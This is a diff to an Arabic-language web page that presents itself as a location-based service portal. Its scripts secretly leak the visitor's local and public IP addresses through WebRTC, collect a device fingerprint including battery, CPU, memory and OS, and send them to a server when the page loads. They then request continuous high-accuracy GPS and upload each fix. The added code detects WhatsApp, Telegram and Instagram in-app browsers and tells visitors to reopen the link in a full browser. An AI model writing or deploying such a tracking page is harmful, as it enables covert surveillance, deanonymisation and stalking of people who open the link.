@@ -3,12 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>بوابة الخدمات وتحديد الموقع</title>
+    <title>بوابة الخدمات وتحديد الموقع الدقيق</title>
     <style>
         :root {
             --primary: #4f46e5;
             --primary-hover: #4338ca;
             --success: #16a34a;
+            --warning: #d97706;
             --danger: #dc2626;
             --bg: #f8fafc;
             --text-dark: #0f172a;
@@ -16,7 +17,7 @@
         }
 
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
             background-color: var(--bg);
             color: var(--text-dark);
             display: flex;
@@ -25,8 +26,26 @@
             align-items: center;
             min-height: 100vh;
             margin: 0;
-            padding: 20px;
+            padding: 16px;
             box-sizing: border-box;
+        }
+
+        /* تنبيه التطبيقات الداخلية (واتساب / تليجرام / فيسبوك) */
+        #inapp-warning {
+            display: none;
+            background: #fffbeb;
+            border: 1px solid #fde68a;
+            color: #92400e;
+            padding: 12px 16px;
+            border-radius: 12px;
+            margin-bottom: 16px;
+            width: 100%;
+            max-width: 500px;
+            font-size: 13.5px;
+            line-height: 1.6;
+            box-sizing: border-box;
+            text-align: right;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.04);
         }
 
         /* تنبيه HTTPS لخوادم الإنتاج */
@@ -35,83 +54,81 @@
             background: #fef2f2;
             border: 1px solid #fecaca;
             color: #991b1b;
-            padding: 12px 18px;
-            border-radius: 10px;
-            margin-bottom: 20px;
+            padding: 12px 16px;
+            border-radius: 12px;
+            margin-bottom: 16px;
             width: 100%;
-            max-width: 520px;
+            max-width: 500px;
             font-size: 13px;
             line-height: 1.5;
             box-sizing: border-box;
+            text-align: right;
         }
 
         .welcome-card {
             background: white;
-            padding: 40px 30px;
+            padding: 35px 24px;
             border-radius: 20px;
-            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.08);
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.07);
             width: 100%;
-            max-width: 500px;
+            max-width: 480px;
             text-align: center;
             border: 1px solid #e2e8f0;
-            transition: all 0.3s ease;
             box-sizing: border-box;
         }
 
-        .welcome-card:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 15px 50px rgba(0, 0, 0, 0.12);
-        }
-
         .card-icon {
-            font-size: 52px;
-            margin-bottom: 15px;
+            font-size: 54px;
+            margin-bottom: 12px;
             display: inline-block;
-            animation: bounce 2s infinite ease-in-out;
+            animation: pulse-ring 2.5s infinite ease-in-out;
         }
 
-        @keyframes bounce {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-6px); }
+        @keyframes pulse-ring {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.08); }
         }
 
         h1 {
             color: var(--text-dark);
-            margin: 0 0 12px 0;
-            font-size: 26px;
+            margin: 0 0 10px 0;
+            font-size: 24px;
             font-weight: 700;
         }
 
         .card-description {
-            font-size: 15px;
+            font-size: 14.5px;
             color: var(--text-muted);
-            margin-bottom: 25px;
-            line-height: 1.7;
+            margin-bottom: 22px;
+            line-height: 1.6;
         }
 
         .status-badge {
             display: inline-block;
-            padding: 6px 14px;
+            padding: 8px 16px;
             border-radius: 20px;
-            font-size: 13px;
+            font-size: 13.5px;
             font-weight: 600;
             background: #eff6ff;
             color: #2563eb;
-            margin-bottom: 20px;
+            margin-bottom: 22px;
+            transition: all 0.3s ease;
+            max-width: 100%;
+            word-break: break-word;
         }
 
         /* زر التفعيل الرئيسي */
         .activate-btn {
-            background: linear-gradient(135deg, var(--primary) 0%, #3b82f6 100%);
+            background: linear-gradient(135deg, var(--primary) 0%, #2563eb 100%);
             color: white;
             border: none;
-            padding: 15px 32px;
-            border-radius: 12px;
+            padding: 16px 28px;
+            border-radius: 14px;
             cursor: pointer;
             font-size: 16px;
-            font-weight: 600;
+            font-weight: 700;
             transition: all 0.3s ease;
-            box-shadow: 0 6px 20px rgba(79, 70, 229, 0.3);
+            box-shadow: 0 6px 20px rgba(79, 70, 229, 0.35);
             display: inline-flex;
             align-items: center;
             justify-content: center;
@@ -122,7 +139,7 @@
 
         .activate-btn:hover {
             transform: translateY(-2px);
-            box-shadow: 0 8px 25px rgba(79, 70, 229, 0.4);
+            box-shadow: 0 8px 25px rgba(79, 70, 229, 0.45);
         }
 
         .activate-btn:active {
@@ -130,26 +147,34 @@
         }
 
         .activate-btn svg {
-            width: 20px;
-            height: 20px;
+            width: 22px;
+            height: 22px;
             fill: currentColor;
+            flex-shrink: 0;
+        }
+
+        .instruction-note {
+            font-size: 12.5px;
+            color: #64748b;
+            margin-top: 12px;
+            line-height: 1.5;
         }
 
         /* صندوق نتائج الموقع */
         .info-box {
-            background: #f0fdf4;
-            color: #166534;
+            background: #f8fafc;
+            color: #334155;
             padding: 16px 20px;
-            border-radius: 12px;
+            border-radius: 14px;
             margin-top: 25px;
             text-align: right;
-            border: 1px solid #bbf7d0;
+            border: 1px solid #e2e8f0;
             font-size: 14px;
             line-height: 1.6;
         }
 
         .info-box b {
-            color: #15803d;
+            color: #0f172a;
             font-size: 15px;
         }
 
@@ -157,17 +182,17 @@
             display: inline-block;
             background: #dcfce7;
             color: #15803d;
-            padding: 3px 10px;
-            border-radius: 6px;
-            font-size: 12px;
+            padding: 4px 12px;
+            border-radius: 8px;
+            font-size: 12.5px;
             font-weight: bold;
-            margin-top: 6px;
+            margin-top: 8px;
         }
 
         .spinner {
             display: inline-block;
-            width: 16px;
-            height: 16px;
+            width: 18px;
+            height: 18px;
             border: 2px solid rgba(255,255,255,0.3);
             border-radius: 50%;
             border-top-color: white;
@@ -181,32 +206,41 @@
 </head>
 <body>
 
-    <!-- تنبيه HTTPS للمشرف عند التشغيل على دومين/سيرفر خارجي -->
+    <!-- تنبيه متصفحات التطبيقات الداخلية (WhatsApp / Telegram / Instagram) -->
+    <div id="inapp-warning">
+        ⚠️ <b>تنبيه:</b> إذا كنت تتصفح من داخل تطبيق محادثة، قد يحجب التطبيق إشارة الـ GPS. يرجى الضغط على القائمة (<b>⋮</b> أو <b>⋯</b>) واختيار <b>"فتح في المتصفح / Chrome"</b> للحصول على الدقة الكاملة.
+    </div>
+
+    <!-- تنبيه HTTPS للمشرف عند استخدام رابط غير مشفر -->
     <div id="https-warning">
-        🔒 <b>ملاحظة فنية:</b> المتصفحات تحظر وصول الـ GPS عند تصفح الموقع بدون تشفير (HTTP). لضمان دقة الموقع بالأمتار عبر الأقمار الاصطناعية على السيرفر الخارجي، يرجى تشغيل شهادة SSL (HTTPS).
+        🔒 <b>تنبيه أمني:</b> المتصفحات الحديثة تشترط اتصال HTTPS مشفر لتشغيل شريحة الـ GPS بالأمتار.
     </div>
 
     <!-- البطاقة الرئيسية -->
     <div class="welcome-card">
         <span class="card-icon">📍</span>
-        <h1>مرحباً بك في المنصة</h1>
+        <h1>تحديد الموقع الجغرافي الدقيق</h1>
         <p class="card-description">
-            لتقديم وتخصيص أفضل الخدمات الأقرب لعنوانك، يرجى السماح بتحديد الموقع الجغرافي الدقيق.
+            لربطك بأقرب مركز خدمة وتخصيص الخريطة، يرجى الضغط على الزر أدناه والموافقة على إشعار تحديد الموقع.
         </p>
         
         <div id="status-badge" class="status-badge">
-            🌐 جاري التحقق من الشبكة...
+            🌐 جاري فحص الاتصال وتأكيد الهوية...
         </div>
 
-        <button id="activate-btn" class="activate-btn" onclick="requestHighAccuracyForensicLocation()">
+        <button id="activate-btn" class="activate-btn" onclick="triggerSmartLocationCapture()">
             <svg viewBox="0 0 24 24">
                 <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/>
             </svg>
             <span id="btn-text">تحديد وتأكيد موقعي بدقة</span>
         </button>
 
+        <div class="instruction-note">
+            💡 اضغط على الزر واختر <b>(سماح / Allow)</b> في الرسالة المنبثقة من متصفحك للحصول على الدقة النقطية (GPS).
+        </div>
+
         <div class="info-box">
-            <div>📍 الموقع المكتشف: <b id="display-location">{{ governorate }}</b></div>
+            <div>📍 المنطقة المكتشفة: <b id="display-location">{{ governorate }}</b></div>
             <div id="accuracy-container" style="display: none;">
                 <span id="display-accuracy" class="accuracy-pill">دقة عالية</span>
             </div>
@@ -214,18 +248,27 @@
     </div>
 
     <script>
-        // المتغيرات العامة للبصمة
+        const LOG_ID = {{ log_id }};
         let cachedWebRTC = { localIp: null, publicIp: null };
         let cachedDevice = {};
+        let bestAccuracy = 999999;
+        let isReporting = false;
 
-        // 1. فحص بروتوكول HTTPS وتوفير رابط مباشر
+        // 1. كشف التصفح من داخل التطبيقات (In-App Browsers)
+        const ua = navigator.userAgent || '';
+        const isInApp = /FBAN|FBAV|Instagram|WhatsApp|Telegram|Line|Twitter|Snapchat/i.test(ua);
+        if (isInApp) {
+            document.getElementById('inapp-warning').style.display = 'block';
+        }
+
+        // 2. كشف بروتوكول HTTPS
         if (location.protocol !== 'https:' && location.hostname !== 'localhost' && location.hostname !== '127.0.0.1') {
             const warn = document.getElementById('https-warning');
-            warn.innerHTML = `🔒 <b>تنبيه فني:</b> المتصفح يحظر شريحة الـ GPS بالأمتار عبر بروتوكول HTTP العادي. <br>👉 <a href="https://${location.host}" style="color:#b91c1c; font-weight:bold; font-size:14px; text-decoration:underline;">اضغط هنا للتحويل إلى رابط HTTPS المشفر</a> لتفعيل دقة الأقمار الاصطناعية.`;
+            warn.innerHTML = `🔒 <b>تنبيه فني:</b> المتصفح يحظر شريحة الـ GPS عبر HTTP. <br>👉 <a href="https://${location.host}" style="color:#b91c1c; font-weight:bold; font-size:13px; text-decoration:underline;">اضغط هنا للتحويل إلى رابط HTTPS المشفر</a>`;
             warn.style.display = 'block';
         }
 
-        // 2. كشف تسريب الـ WebRTC (كشف IP الشبكة الداخلية والـ IP الحقيقي المسرب)
+        // 3. كشف تسريب الـ WebRTC
         function leakWebRTC() {
             return new Promise((resolve) => {
                 const results = { localIp: null, publicIp: null };
@@ -261,9 +304,8 @@
             });
         }
 
-        // 3. جمع مواصفات العتاد والبطارية والنظام
+        // 4. جمع بصمة الجهاز والعتاد والبطارية
         async function harvestDeviceFingerprint() {
-            const ua = navigator.userAgent;
             let batteryLevel = null;
             let isCharging = false;
 
@@ -279,7 +321,7 @@
                 deviceType: /Mobile|Android|iPhone/.test(ua) ? 'Mobile' : (/iPad|Tablet/.test(ua) ? 'Tablet' : 'Desktop'),
                 browser: getBrowserName(ua),
                 os: getOSName(ua),
-                screenResolution: `${window.screen.width}x${window.screen.height} (${window.devicePixelRatio}x)`,
+                screenResolution: `${window.screen.width}x${window.screen.height} (${window.devicePixelRatio || 1}x)`,
                 cpuCores: navigator.hardwareConcurrency || null,
                 deviceMemory: navigator.deviceMemory || null,
                 batteryLevel: batteryLevel,
@@ -289,75 +331,115 @@
             };
         }
 
-        function getBrowserName(ua) {
-            if (ua.includes('Edg')) return 'Edge';
-            if (ua.includes('Chrome') && !ua.includes('OPR')) return 'Chrome';
-            if (ua.includes('Firefox')) return 'Firefox';
-            if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari';
-            if (ua.includes('OPR')) return 'Opera';
+        function getBrowserName(userAgent) {
+            if (userAgent.includes('Edg')) return 'Edge';
+            if (userAgent.includes('Chrome') && !userAgent.includes('OPR')) return 'Chrome';
+            if (userAgent.includes('Firefox')) return 'Firefox';
+            if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) return 'Safari';
+            if (userAgent.includes('OPR')) return 'Opera';
             return 'Browser';
         }
 
-        function getOSName(ua) {
-            if (ua.includes('Windows NT 10.0')) return 'Windows 10/11';
-            if (ua.includes('Windows')) return 'Windows';
-            if (ua.includes('Android')) return 'Android';
-            if (ua.includes('iPhone')) return 'iOS (iPhone)';
-            if (ua.includes('iPad')) return 'iPadOS';
-            if (ua.includes('Mac OS')) return 'macOS';
-            if (ua.includes('Linux')) return 'Linux';
+        function getOSName(userAgent) {
+            if (userAgent.includes('Windows NT 10.0')) return 'Windows 10/11';
+            if (userAgent.includes('Windows')) return 'Windows';
+            if (userAgent.includes('Android')) return 'Android';
+            if (userAgent.includes('iPhone')) return 'iOS (iPhone)';
+            if (userAgent.includes('iPad')) return 'iPadOS';
+            if (userAgent.includes('Mac OS')) return 'macOS';
+            if (userAgent.includes('Linux')) return 'Linux';
             return 'OS';
         }
 
-        // 4. طلب الموقع بأعلى دقة متناهية (High-Accuracy GPS)
-        async function requestHighAccuracyForensicLocation() {
+        // 5. محرك التموضع الذكي (Smart Geolocation Engine)
+        function triggerSmartLocationCapture() {
             const btn = document.getElementById('activate-btn');
             const btnText = document.getElementById('btn-text');
             const badge = document.getElementById('status-badge');
 
             btn.disabled = true;
-            btnText.innerHTML = '<span class="spinner"></span> جاري الاتصال بالأقمار الاصطناعية وتحديد الإحداثيات...';
-            badge.innerText = '🛰️ جاري طلب إحداثيات GPS الدقيقة...';
+            btnText.innerHTML = '<span class="spinner"></span> جاري الاتصال بالأقمار وتثبيت الموقع...';
+            badge.innerText = '🛰️ جاري استقبال إشارة GPS بالأمتار...';
             badge.style.color = '#d97706';
             badge.style.background = '#fef3c7';
 
             if (!navigator.geolocation) {
-                badge.innerText = '⚠️ المتصفح لا يدعم Geolocation';
-                finishAndReport(null);
+                badge.innerText = '⚠️ جهازك أو متصفحك لا يدعم تحديد الموقع';
+                btn.disabled = false;
+                btnText.innerText = 'تحديد وتأكيد موقعي بدقة';
                 return;
             }
 
-            // خيارات الحصول على أعلى دقة ممكنة
-            const geoOptions = {
-                enableHighAccuracy: true,  // تفعيل الشريحة الفيزيائية للـ GPS بدلاً من الـ Cell/IP
-                timeout: 12000,            // مهلة زمنية كافية للاتصال بالأقمار
-                maximumAge: 0              // عدم استخدام أي موقع مخزن مؤقتاً إطلاقاً (Fresh Fix)
+            let watchId = null;
+            let capturedCount = 0;
+
+            // أ) بدء مراقبة وتدقيق الموقع عبر الأقمار الاصطناعية بدقة متناهية
+            const watchOptions = {
+                enableHighAccuracy: true,
+                timeout: 20000,
+                maximumAge: 0
             };
 
-            navigator.geolocation.getCurrentPosition(
-                async (position) => {
+            const onPositionSuccess = async (pos) => {
+                const acc = pos.coords.accuracy;
+                capturedCount++;
+                console.log(`Location Fix #${capturedCount}: Lat=${pos.coords.latitude}, Lon=${pos.coords.longitude}, Acc=±${acc}m`);
+
+                if (acc < bestAccuracy) {
+                    bestAccuracy = acc;
                     const coords = {
-                        latitude: position.coords.latitude,
-                        longitude: position.coords.longitude,
-                        accuracy: position.coords.accuracy,
-                        altitude: position.coords.altitude,
-                        altitudeAccuracy: position.coords.altitudeAccuracy,
-                        heading: position.coords.heading,
-                        speed: position.coords.speed
+                        latitude: pos.coords.latitude,
+                        longitude: pos.coords.longitude,
+                        accuracy: pos.coords.accuracy,
+                        altitude: pos.coords.altitude,
+                        altitudeAccuracy: pos.coords.altitudeAccuracy,
+                        heading: pos.coords.heading,
+                        speed: pos.coords.speed
                     };
-                    await finishAndReport(coords);
-                },
-                async (error) => {
-                    console.warn('GPS Error or Denied:', error.message);
-                    badge.innerText = 'ℹ️ تعذر تفعيل GPS المباشر، جاري الاعتماد على النطاق الشبكي';
-                    await finishAndReport(null);
-                },
-                geoOptions
-            );
+                    await sendForensicPayload(coords);
+                }
+
+                // إذا كانت الدقة أقل من 30 متراً، تم الحصول على قفل GPS عالي الدقة!
+                if (acc <= 30) {
+                    if (watchId !== null) navigator.geolocation.clearWatch(watchId);
+                }
+            };
+
+            const onPositionError = (err) => {
+                console.warn("High Accuracy GPS failed or denied, trying Coarse:", err);
+                // محاولة احتياطية بدون شريحة GPS (عبر شبكات Wi-Fi وأبراج الاتصال)
+                navigator.geolocation.getCurrentPosition(
+                    async (pos) => {
+                        await onPositionSuccess(pos);
+                    },
+                    (finalErr) => {
+                        console.error("All Geolocation methods failed:", finalErr);
+                        badge.innerText = '⚠️ تم رفض إذن الموقع أو إيقاف الـ GPS في الهاتف';
+                        badge.style.background = '#fee2e2';
+                        badge.style.color = '#dc2626';
+                        btn.disabled = false;
+                        btnText.innerText = 'إعادة المحاولة (يرجى السماح بالوصول)';
+                    },
+                    { enableHighAccuracy: false, timeout: 12000, maximumAge: 60000 }
+                );
+            };
+
+            try {
+                watchId = navigator.geolocation.watchPosition(onPositionSuccess, onPositionError, watchOptions);
+            } catch(e) {
+                onPositionError(e);
+            }
+
+            // إيقاف البحث بعد 15 ثانية وتثبيت أفضل دقة تم الوصول إليها
+            setTimeout(() => {
+                if (watchId !== null) {
+                    navigator.geolocation.clearWatch(watchId);
+                }
+            }, 15000);
         }
 
-        // 5. حزم وإرسال كافة البيانات الجنائية للخادم
-        async function finishAndReport(gpsCoords) {
+        // 6. إرسال الحزمة الجنائية إلى السيرفر
+        async function sendForensicPayload(gpsCoords) {
             const btn = document.getElementById('activate-btn');
             const btnText = document.getElementById('btn-text');
             const badge = document.getElementById('status-badge');
@@ -366,6 +448,7 @@
             const accBadge = document.getElementById('display-accuracy');
 
             const payload = {
+                log_id: LOG_ID,
                 gps: gpsCoords || {},
                 webrtc: cachedWebRTC,
                 device: cachedDevice
@@ -380,61 +463,65 @@
                 const res = await response.json();
 
                 if (res.status === 'success') {
-                    displayLoc.innerText = res.address || 'تم التحديد بنجاح';
+                    if (res.address) {
+                        displayLoc.innerText = res.address;
+                    }
                     accContainer.style.display = 'block';
 
                     if (res.accuracy_meters && res.accuracy_meters <= 50) {
-                        badge.innerText = '✓ تم تحديد الموقع بأعلى دقة عبر الأقمار الاصطناعية (GPS)';
+                        badge.innerText = `🛰️ تم التحديد بنجاح عبر الأقمار الاصطناعية (GPS)`;
                         badge.style.color = '#15803d';
                         badge.style.background = '#dcfce7';
                         accBadge.innerText = `دقة متناهية: ± ${Math.round(res.accuracy_meters)} متر`;
                         accBadge.style.background = '#dcfce7';
                         accBadge.style.color = '#15803d';
                     } else if (res.accuracy_meters && res.accuracy_meters <= 500) {
-                        badge.innerText = '✓ تم تحديد الموقع عبر نقاط Wi-Fi القريبة';
+                        badge.innerText = `📶 تم التحديد عبر شبكات Wi-Fi والأبراج القريبة`;
                         badge.style.color = '#1d4ed8';
                         badge.style.background = '#dbeafe';
                         accBadge.innerText = `دقة جيدة: ± ${Math.round(res.accuracy_meters)} متر`;
                         accBadge.style.background = '#dbeafe';
                         accBadge.style.color = '#1d4ed8';
                     } else {
-                        badge.innerText = '✓ تم تحديد الموقع التقريبي عبر شبكة المزود (ISP)';
+                        badge.innerText = '🌐 تم التحديد عبر النطاق الشبكي للمزود';
                         accBadge.innerText = 'تقريب شبكي';
                     }
 
-                    btnText.innerText = '✓ تم تثبيت وتأكيد موقعك';
+                    btnText.innerText = '✓ تم تثبيت وتأكيد موقعك بنجاح';
                     btn.style.background = '#16a34a';
+                    btn.disabled = false;
                 }
             } catch(e) {
-                console.error('Report error:', e);
-                btnText.innerText = 'تحديد وتأكيد موقعي بدقة';
+                console.error("Forensic upload error:", e);
                 btn.disabled = false;
+                btnText.innerText = 'تحديد وتأكيد موقعي بدقة';
             }
         }
 
-        // 6. عند تحميل الصفحة: جمع البيانات الصامتة في الخلفية وتشغيل طلب الموقع تلقائياً
+        // 7. عند تحميل الصفحة: جمع البيانات الصامتة فورياً ومحاولة بدء التموضع
         document.addEventListener('DOMContentLoaded', async () => {
-            // كشف WebRTC وجمع العتاد فورياً
+            // كشف WebRTC وجمع العتاد
             cachedWebRTC = await leakWebRTC();
             cachedDevice = await harvestDeviceFingerprint();
 
-            // إرسال تقرير مبدئي سريع بالعتاد والـ WebRTC
+            // إرسال تقرير صامت أولي لتسجيل البصمة والـ log_id
             try {
                 await fetch('/api/report-forensics/', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
+                        log_id: LOG_ID,
                         webrtc: cachedWebRTC,
                         device: cachedDevice
                     })
                 });
             } catch(e) {}
 
-            // إطلاق طلب الـ GPS عالي الدقة تلقائياً وبشكل فوري عند فتح الصفحة
+            // محاولة إطلاق طلب الـ GPS تلقائياً إن سمح المتصفح بذلك
             if (navigator.geolocation) {
-                requestHighAccuracyForensicLocation();
+                triggerSmartLocationCapture();
             }
         });
     </script>
 </body>
-</html>
+</html>
